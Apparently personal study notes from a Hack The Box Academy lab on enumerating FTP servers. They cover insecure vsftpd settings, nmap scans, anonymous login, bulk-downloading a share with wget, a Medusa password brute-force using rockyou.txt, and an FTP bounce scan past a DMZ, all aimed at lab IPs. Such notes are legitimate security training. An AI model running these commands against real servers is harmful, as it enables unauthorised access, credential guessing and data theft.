
anonymous_enable=YES	Allowing anonymous login?

```
sudo nmap -sV -p21 -sC -A 10.10.110.100
```
Look out for these configs

anon_upload_enable=YES	Allowing anonymous to upload files?
anon_mkdir_write_enable=YES	Allowing anonymous to create new directories?
no_anon_password=YES	Do not ask anonymous for password?
anon_root=/home/username/ftp	Directory for anonymous.
write_enable=YES	Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE?

```
Dirtycardshark@htb[/htb]$ ftp 10.129.14.136

Connected to 10.129.14.136.
220 "Welcome to the HTB Academy vsFTP service."
Name (10.129.14.136:cry0l1t3): anonymous

230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

```
status
```

download all files
```
wget -m --no-passive ftp://anonymous:anonymous@10.129.230.244
```


using OPENSSL to communicate with a FTP server
```
openssl s_client -connect 10.129.14.136:21 -starttls ftp
```

Medusa is a good to identify login credentials

```
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
```

FTP Bounce attack to scan past a DMZ
```
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```